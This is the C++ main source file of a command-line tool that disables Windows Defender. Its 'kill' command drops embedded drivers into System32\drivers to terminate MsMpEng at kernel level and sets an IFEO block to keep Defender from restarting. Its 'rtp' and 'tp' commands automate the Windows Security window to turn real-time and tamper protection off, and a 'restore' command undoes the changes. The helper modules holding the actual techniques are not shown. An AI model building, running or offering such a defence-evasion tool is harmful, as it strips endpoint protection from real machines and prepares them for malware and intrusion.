#include "WinDefCtl.h"
#include "BannerUtils.h"
#include "DefenderManager.h"
#include "KillerEngine.h"
#include "DriverExtract.h"
#include "Console.h"
#include "StrUtils.h"
#include "RuntimeSupport.h"

#include <windows.h>
#include <shellapi.h>

int wmain(int argc, wchar_t* argv[]) {
    // Report input idle immediately to eliminate Windows wait cursor (IDC_WAIT / IDC_APPSTARTING)
    MsgWaitForMultipleObjects(0, nullptr, FALSE, 0, QS_ALLINPUT);

    if (argc < 2) {
        BannerUtils::ShowUsage();
        return 0;
    }

    const wchar_t* command = argv[1];

    // ── kill ─────────────────────────────────────────────────────────────────
    if (StrUtils::StrEqual(command, L"kill")) {
        BannerUtils::ShowBanner();
        Console::DbgPrintLine(L"\r\n=== Windows Defender Kill ===\r\n");

        Console::DbgPrintLine(L"[*] Extracting drivers...");
        ExtractedDrivers drv{};
        if (!ExtractDrivers(drv)) {
            Console::PrintLine(L"[!] Driver extraction failed");
            return 1;
        }

        if (!DefenderManager::DisableSecurityEngine()) {
            CleanupExtractedDrivers(drv);
            return 1;
        }

        if (!KillerEngine::KillDefender(drv))
            Console::DbgPrintLine(L"[-] Kernel kill incomplete");

        // Clean up both driver files after kill action finishes
        CleanupExtractedDrivers(drv);

        auto status = DefenderManager::QueryStatus();
        if (!status.winDefendRunning && !status.msmpengRunning)
            Console::PrintLine(L"\r\n[+] WinDefend service stopped. Defender is blocked.");
        else if (!status.msmpengRunning)
            Console::PrintLine(L"\r\n[*] MsMpEng killed but WinDefend still registered as running.");
        else
            Console::PrintLine(L"\r\n[-] MsMpEng still running. IFEO block active -- will not survive restart.");
        return 0;
    }

    // ── restore ───────────────────────────────────────────────────────────────
    // Remove IFEO block + start WinDefend. No UI overlay (silent).
    if (StrUtils::StrEqual(command, L"restore")) {
        BannerUtils::ShowBanner();
        Console::DbgPrintLine(L"\r\n=== Windows Defender Restore ===\r\n");

        if (!DefenderManager::EnableSecurityEngine())
            return 1;

        // Clean up any lingering driver files from System32\drivers on restore
        wchar_t winDir[MAX_PATH] = {};
        GetSystemWindowsDirectoryW(winDir, MAX_PATH);
        ExtractedDrivers drvClean{};
        StrUtils::StrCopy(drvClean.drv1Path, MAX_PATH, winDir);
        StrUtils::StrConcat(drvClean.drv1Path, MAX_PATH, L"\\System32\\drivers\\1");
        StrUtils::StrCopy(drvClean.drv2Path, MAX_PATH, winDir);
        StrUtils::StrConcat(drvClean.drv2Path, MAX_PATH, L"\\System32\\drivers\\2");
        CleanupExtractedDrivers(drvClean);

        Console::PrintLine(L"\r\n[*] Done. Defender is restored.");
        return 0;
    }

    // ── rtp ───────────────────────────────────────────────────────────────────
    if (StrUtils::StrEqual(command, L"rtp")) {
        BannerUtils::ShowBanner();
        Console::PrintLine(L"\r\n=== Windows Defender RTP Control ===");

        WindowsDefenderAutomation wda;

        if (!wda.openDefenderSettings()) {
            Console::PrintLine(L"  [ERROR] Fatal: Cannot open Windows Security.");
            return 1;
        }

        if (argc < 3) {
            wda.getRealTimeProtectionStatus();
            wda.closeSecurityWindow();
            return 0;
        }

        const wchar_t* action = argv[2];
        bool result = false;

        if (StrUtils::StrEqual(action, L"on"))          result = wda.enableRealTimeProtection();
        else if (StrUtils::StrEqual(action, L"off"))    result = wda.disableRealTimeProtection();
        else if (StrUtils::StrEqual(action, L"status")) result = wda.getRealTimeProtectionStatus();
        else {
            Console::Print(L"  [ERROR] Unknown action: ");
            Console::PrintLine(action);
            BannerUtils::ShowUsage();
        }

        wda.closeSecurityWindow();
        return result ? 0 : 1;
    }

    // ── tp ────────────────────────────────────────────────────────────────────
    if (StrUtils::StrEqual(command, L"tp")) {
        BannerUtils::ShowBanner();
        Console::PrintLine(L"\r\n=== Windows Defender Tamper Protection Control ===");

        WindowsDefenderAutomation wda;

        if (!wda.openDefenderSettings()) {
            Console::PrintLine(L"  [ERROR] Fatal: Cannot open Windows Security.");
            return 1;
        }

        if (argc < 3) {
            wda.getTamperProtectionStatus();
            wda.closeSecurityWindow();
            return 0;
        }

        const wchar_t* action = argv[2];
        bool result = false;

        if (StrUtils::StrEqual(action, L"on"))          result = wda.enableTamperProtection();
        else if (StrUtils::StrEqual(action, L"off"))    result = wda.disableTamperProtection();
        else if (StrUtils::StrEqual(action, L"status")) result = wda.getTamperProtectionStatus();
        else {
            Console::Print(L"  [ERROR] Unknown action: ");
            Console::PrintLine(action);
            BannerUtils::ShowUsage();
        }

        wda.closeSecurityWindow();
        return result ? 0 : 1;
    }

    BannerUtils::ShowUsage();
    return 0;
}

extern "C" int wmainCRTStartup() {
    int argc = 0;
    wchar_t** argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!argv) {
        ExitProcess(1);
    }
    int ret = wmain(argc, argv);
    LocalFree(argv);
    ExitProcess(static_cast<UINT>(ret));
}
